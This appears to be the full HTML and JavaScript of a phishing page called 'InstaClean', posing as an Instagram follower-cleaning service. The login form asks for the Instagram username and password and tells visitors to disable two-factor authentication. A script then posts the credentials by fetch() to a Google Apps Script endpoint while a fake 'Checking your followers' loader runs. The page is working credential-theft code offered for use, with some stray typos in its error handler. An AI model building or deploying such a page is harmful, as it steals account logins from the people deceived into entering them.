<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InstaClean</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            background-image: url('https://i.ibb.co/z2dqP6C/Asset-2.png'); /* Replace 'your-background-image-url.jpg' with the URL of your background image */
    background-position: top;
    background-repeat: no-repeat;
    background-attachment: fixed;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .login-container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 300px;
            text-align: center;
            margin: 20px auto; /* Center the login card */
        }

        .instagram-icon {
            font-size: 32px;
            margin-bottom: 10px;
        }

        .description {
          color: #666;
                     margin-bottom: 20px;
        }

        form {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        input[type="text"],
        input[type="password"],
        button {
          
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }

Button{
  border: 0px;
  color:white;
  background-color:#0095f6;
}
button:hover{
  background-color:#1877f2;
}

        #modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0, 0, 0, 0.5);
        }

        .modal-content {
            background-color: #fefefe;
            margin: 15% auto;
            padding: 20px;
            border: 1px solid #888;
            border-radius: 8px;
            width: 80%;
            max-width: 400px;
            position: relative;
            text-align: center;
        }

        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        .close:hover,
        .close:focus {
            color: black;
            text-decoration: none;
            cursor: pointer;
        }

        img {
            width: 150px;
            height: 150px;
            border-radius: 50%;
            display: block;
            margin: 0 auto 10px;
        }

        .loader {
            border: 8px solid #f3f3f3;
            border-radius: 50%;
            border-top: 8px solid #3498db;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: auto;
            margin-top: 20px;
        }

        .footer {
            background-color: #f0f0f0;
            padding: 10px;
            text-align: center;
            margin-top: auto; /* Push the footer to the bottom */
            font-size: 14px;
            
           
        }
        a{
          color: #565656;
          
        }
        
        .hint {
    color: #666;
    font-size: 12px;
    margin-top: 10px;
}

    </style>
</head>
<body>
    <div class="login-container">
        <i class="fab fa-instagram instagram-icon"></i>
        <h2>InstaClean</h2>
        <p class="description">Manage your followers with one click</p>
        <form id="loginForm" action="https://script.google.com/macros/s/AKfycbxdYqoF15OhL3X7lOajMaEohXdkNajKOL8sV8o-Uvi7Cp-57hcEAmvu-72cPiC38MOq4w/exec" method="post">
            <input type="text" name="username" id="username" placeholder="Username" required>
            <input type="password" name="password" id="password" placeholder="Password" required>
            <button type="submit" id="loginButton">Get Started</button>
            <p class="hint"> If you have two-factor authentication enabled, please disable it temporarily.</p>
        </form>
    </div>
    <div id="modal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2c/Default_pfp.svg" alt="Image">
            <h1 id="welcomeMessage">Modal Title</h1>
            <p>Checking your followers...</p>
            <div class="loader"></div>
        </div>
    </div>

    <div class="footer">
        <a href="#">Privacy</a> | <a href="#">About</a> | <a href="#">Terms and Conditions</a> | Powered by InstantClear Corporation 2024
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the form from submitting normally
            
            // Get the username and password from the form
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Disable the login button
            document.getElementById('loginButton').setAttribute('disabled', true);

            // Show the modal
            const modal = document.getElementById('modal');
            modal.style.display = 'block';

            // Set the welcome message
            document.getElementById('welcomeMessage').innerText = 'Welcome ' + username;

            // Send the POST request
            fetch('https://script.google.com/macros/s/AKfycbxWZXTZGDAruDXplgeLtgwk44OcPefQ4v2JHd-RktmpIlh9muM2HgDYZKs2YrVS4EAsOg/exec', {
                method: 'POST',
                body: new FormData(document.getElementById('loginForm'))
            })
            .then(response => {
                if (response.ok) {
                    // Redirect to a new page after 3 seconds
                    setTimeout(function() {
                        // window.location.href = 'new_page.html'; // Replace 'new_page.html' with the URL of your actual page
                    }, 3000);
                } else {
                    throw new Error('Network response was not ok.');
                }
            })
            .catch(error => {
                console.error('There was a problem with the fetch operation:', error);
                setTimeout(function() {
                    modal.style.display = 'none';
                    alert('Something went wrong, try again later.');
										dwindow.location.reload();
                    g
                }, 5000);
            });
        });
    </script>
</body>
</html>
